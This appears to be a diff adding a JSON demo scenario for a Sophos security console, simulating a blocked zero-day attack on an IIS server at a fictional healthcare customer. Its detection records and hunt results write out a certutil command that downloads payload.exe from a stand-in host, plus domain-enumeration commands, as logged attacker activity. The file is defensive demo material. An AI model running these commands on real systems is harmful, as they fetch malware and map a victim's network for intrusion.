@@ -1,0 +1,129 @@
+{
+  "id": "zero-day-default",
+  "name": "Zero-Day Exploit",
+  "description": "Previously unknown vulnerability exploited in the wild. Sophos detects the exploit via behavioral analysis and deep learning — no signature existed yet.",
+  "version": 1,
+  "createdAt": "2026-03-23T00:00:00Z",
+  "customer": { "name": "Contoso Healthcare", "industry": "healthcare", "endpointCount": 2500, "serverCount": 186 },
+  "alerts": {
+    "mode": "prepend",
+    "items": [
+      {
+        "product": "endpoint", "threat": "Exp/CVE-2026-0-A", "threat_cleanable": false,
+        "created_at": "-25m", "severity": "high", "actionable": true, "category": "runtime_detections",
+        "when": "-25m", "allowedActions": ["ACKNOWLEDGE"], "location": "SRV-WEB01",
+        "type": "Event::Endpoint::HmpaExploit::HeapSpray", "source": null,
+        "data": { "created_at": "-25m", "endpoint_type": "server", "endpoint_platform": "windows" },
+        "description": "Zero-day exploit detected: Unknown vulnerability in IIS web server on SRV-WEB01. Heap spray attack followed by shellcode injection into w3wp.exe. Blocked by Sophos Exploit Prevention — no signature required.",
+        "info": "Deep learning model confidence: 99.7%. No CVE assigned yet — reported to SophosLabs."
+      },
+      {
+        "product": "endpoint", "threat": null, "threat_cleanable": null,
+        "created_at": "-20m", "severity": "high", "actionable": true, "category": "runtime_detections",
+        "when": "-20m", "allowedActions": ["ACKNOWLEDGE"], "location": "SRV-WEB01",
+        "type": "Event::Endpoint::CoreDetection::SuspiciousActivity", "source": null,
+        "data": { "created_at": "-20m", "endpoint_type": "server", "endpoint_platform": "windows" },
+        "description": "Post-exploitation attempt on SRV-WEB01: w3wp.exe spawned cmd.exe attempting to download payload from 198.51.100.23. Adaptive Attack Protection blocked the download and activated enhanced monitoring.",
+        "info": "Attacker attempted to establish persistence after exploit — blocked by behavioral detection"
+      },
+      {
+        "product": "endpoint", "threat": null, "threat_cleanable": null,
+        "created_at": "-15m", "severity": "medium", "actionable": false, "category": "runtime_detections",
+        "when": "-15m", "allowedActions": ["ACKNOWLEDGE"], "location": "SRV-WEB01",
+        "type": "Event::Endpoint::CoreDetection::ReconActivity", "source": null,
+        "data": { "created_at": "-15m", "endpoint_type": "server", "endpoint_platform": "windows" },
+        "description": "Reconnaissance blocked on SRV-WEB01: After initial exploit was stopped, attacker attempted network enumeration (nltest, net group) via remaining web shell. All commands intercepted by Sophos.",
+        "info": "Web shell remnant detected and removed"
+      }
+    ],
+    "summaryDelta": { "high": 2, "medium": 1, "low": 0 }
+  },
+  "cases": {
+    "mode": "prepend",
+    "items": [{
+      "type": "investigation", "name": "Zero-Day Exploit — IIS Server (SRV-WEB01)",
+      "managedBy": "self", "createdAt": "-25m", "createdBy": { "name": "Auto-generated" }, "updatedAt": "-10m", "status": "investigating",
+      "initialDetection": {
+        "severity": 9, "type": "Threat", "detectionRule": "WIN-EXP-HEAP-SPRAY-SHELLCODE-1",
+        "mitreAttacks": [
+          { "tactic": { "id": "TA0001", "name": "Initial Access", "techniques": [{ "id": "T1190", "name": "Exploit Public-Facing Application" }] } },
+          { "tactic": { "id": "TA0002", "name": "Execution", "techniques": [{ "id": "T1059.003", "name": "Windows Command Shell" }] } },
+          { "tactic": { "id": "TA0005", "name": "Defense Evasion", "techniques": [{ "id": "T1055", "name": "Process Injection" }] } },
+          { "tactic": { "id": "TA0007", "name": "Discovery", "techniques": [{ "id": "T1018", "name": "Remote System Discovery" }] } }
+        ],
+        "time": "-25m", "sensor": { "type": "endpoint", "source": "Sophos Endpoint" }
+      },
+      "assignee": { "name": "SOC Analyst" },
+      "overview": "Zero-day exploit targeting IIS on SRV-WEB01:\n\n• No CVE exists — this is a previously unknown vulnerability\n• Sophos detected via behavioral analysis (heap spray + shellcode injection)\n• Deep learning confidence: 99.7%\n• Exploit blocked BEFORE payload download\n• Attacker attempted post-exploitation but was blocked at every step\n• Attack originated from 198.51.100.23 (TOR exit node)\n\nKey takeaway: Signature-based detection would have missed this entirely. Sophos's AI-driven approach caught a zero-day in real-time.\n\nRecommended: Patch IIS when vendor releases update, block 198.51.100.23, review web application firewall rules.",
+      "detectionCount": 7, "escalated": true
+    }]
+  },
+  "detections": {
+    "mode": "prepend",
+    "items": [
+      {
+        "detectionCreatedAt": "-25m", "connectorGeneratedAt": "-25m",
+        "connector": { "id": "SophosSensorID", "type": "endpoint", "vendor": "Sophos", "version": "SED Driver 4.2.1" },
+        "device": { "type": "server", "hostname": "SRV-WEB01" },
+        "rawData": {
+          "meta_hostname": "SRV-WEB01", "meta_ip_address": "192.168.1.10", "meta_os_name": "Microsoft Windows Server 2022",
+          "meta_username": "IIS APPPOOL\\DefaultAppPool",
+          "cmdline": "w3wp.exe -ap \"DefaultAppPool\" -v \"v4.0\" -l \"webengine4.dll\"",
+          "path": "C:\\Windows\\System32\\inetsrv\\w3wp.exe", "parent_name": "svchost.exe"
+        },
+        "risk": 9, "category": "Threat", "classificationRule": "WIN-EXP-HEAP-SPRAY-SHELLCODE-1",
+        "ruleDescription": "Heap spray exploit detected in IIS worker process — shellcode injection blocked by exploit prevention",
+        "mitreAttacks": [{ "tactic": { "id": "TA0001", "name": "Initial Access", "techniques": [{ "id": "T1190", "name": "Exploit Public-Facing Application" }] } }],
+        "attackType": "Exploit", "severity": 9, "detectionAttack": { "name": "Zero-Day Exploit Chain" }, "detectionLicenses": ["XDR"],
+        "geolocation": {}, "intelixFileReputation": { "score": 0, "label": "Unknown (Zero-Day)" },
+        "detectionType": "Behavioral", "suppressed": false, "caseDescription": "Zero-day IIS heap spray exploit"
+      },
+      {
+        "detectionCreatedAt": "-20m", "connectorGeneratedAt": "-20m",
+        "connector": { "id": "SophosSensorID", "type": "endpoint", "vendor": "Sophos", "version": "SED Driver 4.2.1" },
+        "device": { "type": "server", "hostname": "SRV-WEB01" },
+        "rawData": {
+          "meta_hostname": "SRV-WEB01", "meta_ip_address": "192.168.1.10", "meta_os_name": "Microsoft Windows Server 2022",
+          "meta_username": "IIS APPPOOL\\DefaultAppPool",
+          "cmdline": "cmd.exe /c \"certutil -urlcache -split -f http://198.51.100.23/payload.exe C:\\Windows\\Temp\\svc.exe\"",
+          "path": "C:\\Windows\\System32\\cmd.exe", "parent_name": "w3wp.exe"
+        },
+        "risk": 9, "category": "Threat", "classificationRule": "WIN-EXE-IIS-CHILD-PROCESS-DOWNLOAD-1",
+        "ruleDescription": "IIS worker process spawned cmd.exe to download remote payload — post-exploitation blocked",
+        "mitreAttacks": [{ "tactic": { "id": "TA0002", "name": "Execution", "techniques": [{ "id": "T1059.003", "name": "Windows Command Shell" }] } }],
+        "attackType": "Exploit", "severity": 9, "detectionAttack": { "name": "Zero-Day Exploit Chain" }, "detectionLicenses": ["XDR"],
+        "geolocation": {}, "intelixFileReputation": {},
+        "detectionType": "Behavioral", "suppressed": false, "caseDescription": "Post-exploitation payload download blocked"
+      }
+    ]
+  },
+  "billing": { "overrideName": "{{customerName}}", "overrideAlias": "{{customerName}}" },
+  "user": { "overrideCompany": "{{customerName}}", "overrideAlias": "{{customerName}}" },
+  "healthScore": { "override": 85 },
+  "auditLogs": {
+    "mode": "prepend",
+    "items": [
+      { "timestamp": "-20m", "type": "system_event", "category": "endpoint", "action": "Adaptive Attack Protection activated", "actor": "Sophos Endpoint", "actorType": "system", "target": "SRV-WEB01", "targetType": "endpoint", "result": "success", "description": "Enhanced monitoring activated on SRV-WEB01 after zero-day exploit detection. All process executions logged." },
+      { "timestamp": "-15m", "type": "admin_action", "category": "firewall", "action": "Attacker IP blocked", "actor": "SOC Analyst", "actorType": "admin", "target": "198.51.100.23", "targetType": "network", "result": "success", "description": "Inbound and outbound traffic to 198.51.100.23 (TOR exit node) blocked at firewall. Attacker IP reported to SophosLabs threat intelligence." },
+      { "timestamp": "-10m", "type": "system_event", "category": "endpoint", "action": "Web shell removed", "actor": "Sophos Endpoint", "actorType": "system", "target": "SRV-WEB01", "targetType": "endpoint", "result": "success", "description": "Residual web shell (cmd.aspx) detected and removed from C:\\inetpub\\wwwroot\\. No other persistence mechanisms found." }
+    ]
+  },
+  "liveDiscover": {
+    "queryResults": {
+      "id": "auto", "status": "completed",
+      "query": "SELECT p.pid, p.name, p.cmdline, pp.name AS parent FROM processes p JOIN processes pp ON p.parent = pp.pid WHERE pp.name = 'w3wp.exe' OR p.cmdline LIKE '%certutil%' OR p.cmdline LIKE '%198.51.100%'",
+      "queryName": "Zero-Day — IIS Child Process & Payload Download Hunt",
+      "startedAt": "-10m", "completedAt": "-9m", "endpointsQueried": 10, "endpointsResponded": 10, "totalResults": 3,
+      "columns": [ { "name": "pid", "type": "INTEGER" }, { "name": "name", "type": "TEXT" }, { "name": "cmdline", "type": "TEXT" }, { "name": "parent", "type": "TEXT" }, { "name": "endpoint_hostname", "type": "TEXT" } ],
+      "rows": [
+        [7820, "cmd.exe", "cmd.exe /c \"certutil -urlcache -split -f http://198.51.100.23/payload.exe\"", "w3wp.exe", "SRV-WEB01"],
+        [7844, "cmd.exe", "cmd.exe /c \"nltest /dclist:\"", "w3wp.exe", "SRV-WEB01"],
+        [7860, "cmd.exe", "cmd.exe /c \"net group \\\"Domain Admins\\\" /domain\"", "w3wp.exe", "SRV-WEB01"]
+      ]
+    }
+  },
+  "endpointReport": {
+    "overrideTotal": "{{endpointCount}}",
+    "overrideSummary": { "total": "{{endpointCount}}", "active": "{{endpointCount * 0.90}}", "unprotected": 0, "inactive": "{{endpointCount * 0.03}}", "dormant": "{{endpointCount * 0.07}}" }
+  }
+}
